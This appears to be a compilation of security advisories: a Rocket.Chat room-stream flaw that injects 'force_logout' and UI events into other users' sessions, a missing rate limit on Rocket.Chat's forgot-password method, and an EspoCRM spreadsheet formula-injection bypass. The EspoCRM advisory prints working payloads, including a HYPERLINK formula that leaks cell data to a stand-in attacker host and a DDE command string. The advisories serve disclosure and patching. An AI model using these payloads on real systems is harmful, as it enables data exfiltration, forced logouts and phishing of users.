item.description:
CVSS 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L) · CWE-345, CWE-863

Affected:
- Rocket.Chat <8.8.0, <8.7.2, <8.6.2, <8.5.3, <8.4.6, <8.3.8, <8.2.8, <8.1.8, <7.10.15 (patched: 8.8.0, 8.7.2, 8.6.2, 8.5.3, 8.4.6, 8.3.8, 8.2.8, 8.1.8, 7.10.15)

---

## Summary

`GHSA-27jx-236m-3f5j` (fixed in 8.6.1) restricted `stream-notify-user`'s `allowWrite` so a client can no longer write arbitrary events directly to another user's notify-user stream (it now only accepts `video-conference` / `media-calls`). However, the sibling stream `stream-notify-room-users` still **forwards an arbitrary, caller-supplied event name to other room members' notify-user streams**, which re-opens the exact primitive GHSA-27jx set out to close - now reachable by any authenticated user who shares a room with the victim.

By writing `"<sharedRoomId>/force_logout"` to `stream-notify-room-users`, an attacker delivers a `force_logout` event to every other member's notify-user stream, and the client's `useForceLogout` hook wipes local auth - a repeatable, targeted logout (denial of service). The same primitive can inject other high-impact notify-user events such as `uiInteraction` (renders attacker-controlled UIKit modals/banners → UI phishing) and the fake message/notification that GHSA-27jx originally described.

## Root cause

`apps/meteor/server/modules/notifications/notifications.module.ts`:

```ts
// streamUser - the path GHSA-27jx fixed: only 'video-conference' / 'media-calls' are accepted, else return false.
this.streamUser.allowWrite(async function (eventName, data) {
  const [, e] = eventName.split('/');
  if (e === 'video-conference') { /* VideoConf.validateAction(...) */ }
  if (e === 'media-calls')      { /* ... */ return false; }
  return false;                                   // everything else rejected
});

// streamRoomUsers - NOT covered by the fix: the event name `e` is taken from the caller and forwarded verbatim.
this.streamRoomUsers.allowWrite(async function (eventName, ...args) {
  const [roomId, e] = eventName.split('/');       // e is arbitrary at runtime (the type annotation is not a check)
  if (this.userId && (await Subscriptions.countByRoomIdAndUserId(roomId, this.userId)) > 0) {
    const subscriptions = await Subscriptions.findByRoomIdAndNotUserId(roomId, this.userId, {...}).toArray();
    subscriptions.forEach((subscription) => self.notifyUser(subscription.u._id, e, ...args)); // forward to notify-user
  }
  return false;
});

// notifyUser emits straight onto the notify-user stream:
notifyUser(userId, eventName, ...args) { return this.streamUser.emit(`${userId}/${eventName}`, ...args); }
```

Two things make it exploitable:

1. **`e` is never whitelisted at runtime.** The TypeScript type says `` `${string}/video-conference` | `${string}/userData` ``, but at runtime `e = eventName.split('/')[1]` is whatever the caller sends, and it is forwarded to `notifyUser(otherMember, e, …)` → `streamUser.emit(`${otherMember}/${e}`, …)`.
2. **The forward is a side-effect inside `allowWrite`.** The streamer method handler (`streamer.module.ts:244-254`) runs `isWriteAllowed()` (which invokes the `allowWrite` callback) *before* deciding to broadcast. The callback performs the `forEach notifyUser(...)` and then returns `false`. Returning `false` only suppresses the notify-room-users broadcast - the forward to notify-user has already happened.

The client acts on the injected event without validating its origin, e.g. `apps/meteor/client/views/root/hooks/loggedIn/useForceLogout.ts`:

```ts
getNotifyUserStream(`${userId}/force_logout`, () => {
  setForceLogout(true);
  wipeLocalAuth();   // no payload/sender check - any force_logout event logs the user out
});
```

CWE-204, CWE-307

---

## Summary

The Meteor method `sendForgotPasswordEmail`, callable unauthenticated over DDP / WebSocket and over the `POST /api/v1/method.callAnon/sendForgotPasswordEmail` HTTP route, has **no `DDPRateLimiter` rule attached**. Its sibling method `sendConfirmationEmail` (in the same directory, mostly the same shape) does have a rate limit.

## Details

`sendForgotPasswordEmail.ts` in its entirety:

```ts
// apps/meteor/server/methods/sendForgotPasswordEmail.ts
export const sendForgotPasswordEmail = async (to: string): Promise<boolean | undefined> => {
    const email = to.trim().toLowerCase();

    const user = await Users.findOneByEmailAddress(email, { projection: { _id: 1, services: 1 } });

    if (!user) {
        return true;                                  // <-- silent on non-existent
    }

    if (user.services && !user.services.password) {
        if (!settings.get('Accounts_AllowPasswordChangeForOAuthUsers')) {
            return false;                             // <-- distinguishable signal for OAuth-only users
        }
    }

    try {
        Accounts.sendResetPasswordEmail(user._id, email);
        return true;
    } catch (err) {
        SystemLogger.error({ err });
    }
};

Meteor.methods<ServerMethods>({
    async sendForgotPasswordEmail(to) {
        check(to, String);
        return sendForgotPasswordEmail(to);
    },
});

// NB: no DDPRateLimiter.addRule(...) anywhere in this file
```

Compare `sendConfirmationEmail.ts` (same directory, same purpose-class):

```ts
// apps/meteor/server/methods/sendConfirmationEmail.ts:29-39
DDPRateLimiter.addRule(
    { type: 'method', name: 'sendConfirmationEmail', userId() { return true; } },
    5,
    60000,
);
```

The REST endpoint `POST /api/v1/users.forgotPassword` (`apps/meteor/app/api/server/v1/users.ts:1124`) does not set custom `rateLimiterOptions`, so it falls under the API's default REST rate limiter (`API_Enable_Rate_Limiter_Limit_Calls_Default`). That bounds the REST path. The DDP method has no such floor.

## References

- `apps/meteor/server/methods/sendForgotPasswordEmail.ts` - affected file
- `apps/meteor/server/methods/sendConfirmationEmail.ts:29-39` - correct pattern in sibling method
- `apps/meteor/app/api/server/v1/users.ts:1124` - REST entry point (rate-limited via API default)
- `apps/meteor/app/api/server/v1/misc.ts:670-720` - `method.callAnon` HTTP-to-DDP bridge

CVE-2026-55154

Affected:
- composer/espocrm/espocrm <= 9.3.8 (patched: 9.3.9)

---

## Vulnerability Details

**Files**:
- `application/Espo/Tools/Export/Format/Csv/Processor.php` (`sanitizeCellValue()`, ~line 107-122)
- `application/Espo/Tools/Export/Format/Xlsx/OpenSpoutProcessor.php` (`sanitizeCellValue()`, ~line 279-294)
- `application/Espo/Tools/Export/Format/Xlsx/PhpSpreadsheetProcessor.php` (`sanitizeCellValue()`, ~line 622-641)

**CWE**: CWE-1236 — Improper Neutralization of Formula Elements in a CSV File
**Severity**: Medium
**CVSS**: 5.4 — CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

### Root Cause

EspoCRM already implements a CSV/Formula Injection mitigation: if an exported field's value
begins with `=`, `+`, `-`, or `@`, the export processors prefix the value with a single quote
`'` so spreadsheet programs (Excel, LibreOffice, Google Sheets) treat the cell as text rather
than as a formula.

However, all three `sanitizeCellValue()` implementations only inspect `$value[0]` — the
literal first byte of the string:

```php
private function sanitizeCellValue(string $value): string
{
    if ($value === '') {
        return $value;
    }

    if (is_numeric($value)) {
        return $value;
    }

    if (in_array($value[0], ['+', '-', '@', '='])) {
        return "'" . $value;
    }

    return $value;
}
```

Microsoft Excel (and other spreadsheet apps) will still evaluate a cell as a formula even
when the formula-trigger character (`=`, `+`, `-`, `@`) is preceded by whitespace or control
characters such as a tab (`\t`, 0x09) or carriage return (`\r`, 0x0D) — Excel trims leading
whitespace/control characters before deciding whether the cell content is a formula.

A value like `"\t=1+1+cmd|\"/C calc\"!A0"` has `$value[0] === "\t"`, which is **not** in
`['+','-','@','=']`, so the sanitizer returns the value unchanged. The raw, un-prefixed
payload is written to the exported CSV/XLSX file and delivered to the user.

### Attack Scenario

1. A low-privilege user (e.g. a Sales rep or Portal user, depending on entity-level
   create/edit ACL) sets a free-text field they control — e.g. their own Contact
   "Description", a Lead field, a custom text field, or a Note body — to a value beginning
   with a tab character followed by a formula-injection payload, e.g.:
   `\t=HYPERLINK("http://attacker.example/leak?d="&A1&A2,"Click")`
2. An admin/manager later exports the corresponding list (Contacts, Leads, Notes, etc.) to
   CSV or XLSX via the standard Export feature (`POST /Export`).
3. The exported file contains the attacker-controlled cell starting with `\t=...`,
   unescaped (no leading `'`).
4. The admin opens the file in Excel/LibreOffice. The leading tab is stripped/ignored by the
   spreadsheet's formula parser, the cell is evaluated as a formula, and the payload
   executes (e.g. external link / data exfiltration via `HYPERLINK`/`WEBSERVICE`, or — on
   legacy Excel configurations with DDE enabled — command execution).

### Impact

- Client-side formula execution in the spreadsheet application of whoever opens the
  exported CSV/XLSX file (typically an admin/manager with access to Export).
- Potential data exfiltration via formulas referencing other cells / making outbound HTTP
  requests (`HYPERLINK`, `WEBSERVICE`).
- On legacy Excel configurations, potential command execution via DDE.
- Requires authenticated low-privilege attacker plus victim user interaction (opening the
  exported file and accepting any Excel security prompts), so impact is bounded but real —
  this is the same vulnerability class EspoCRM has already chosen to mitigate; the existing
  mitigation is simply incomplete.

### Vulnerable Code

```php
private function sanitizeCellValue(string $value): string
{
    if ($value === '') {
        return $value;
    }

    if (is_numeric($value)) {
        return $value;
    }

    if (in_array($value[0], ['+', '-', '@', '='])) {
        return "'" . $value;
    }

    return $value;
}
```
(identical pattern duplicated in all three export processors; the PhpSpreadsheetProcessor
variant takes `mixed $value` with an additional `is_string()` guard at the top)

### Recommended Fix

Trim leading whitespace/control characters before checking the first character, and prefix
the *original* (untrimmed) value with `'` if the trimmed value starts with a dangerous
character:

```php
private function sanitizeCellValue(string $value): string
{
    if ($value === '') {
        return $value;
    }

    if (is_numeric($value)) {
        return $value;
    }

    $trimmed = ltrim($value, " \t\r\n\v\0");

    if ($trimmed !== '' && in_array($trimmed[0], ['+', '-', '@', '='])) {
        return "'" . $value;
    }

    return $value;
}
```

### Verification

Dynamically confirmed on v9.3.8 in a Docker lab (`espocrm/espocrm:9.3.8` + `mariadb:11`):
- Created a Lead with `description = "\t=1+1+cmd|\"/C calc\"!A0"`.
- Exported via `POST /api/v1/Export` with `format=csv` and `format=xlsx`.
- CSV output (raw bytes, `cat -A`):
  `TestLead,"^I=1+1+cmd|""/C calc""!A0"$` — no leading `'`, cell starts with TAB then `=`.
- XLSX `xl/sharedStrings.xml`:
  `<si><t xml:space="preserve">\t=1+1+cmd|&quot;/C calc&quot;!A0</t></si>` — same bypass.
- Control case `description = "=1+1"` was correctly prefixed to `'=1+1` in both formats,
  confirming the existing mitigation logic is reachable but bypassable via a leading
  whitespace/control character.
